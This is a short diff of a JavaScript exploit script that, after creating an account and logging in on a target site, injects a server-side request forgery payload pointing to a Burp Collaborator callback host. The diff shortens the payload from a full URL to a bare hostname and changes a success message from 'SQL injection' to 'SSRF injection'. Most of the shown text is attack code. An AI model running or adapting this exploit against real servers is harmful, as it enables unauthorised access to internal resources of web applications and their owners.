@@ -70,7 +70,7 @@ async function exploit(targetURL){
     let info = await createAndLogin(targetURL)
 
     await new Promise(r => setTimeout(r, 2000));
-    payload = "https://ojqweoim23edjkl2ndo23mdi203dm23.burpcollaborator.net:443/"
+    payload = "ojqweoim23edjkl2ndo23mdi203dm23.burpcollaborator.net"
     spinner.text = 'Successful SSRF Injection: ' + payload;
 
     const form = new FormData();
@@ -95,7 +95,7 @@ async function exploit(targetURL){
     await new Promise(r => setTimeout(r, 1000));
     spinner.stopAndPersist({
         symbol: logSymbols.success,
-        text: 'Successful SQL injection attack - done',
+        text: 'Successful SSRF injection attack - done',
     });
 
     
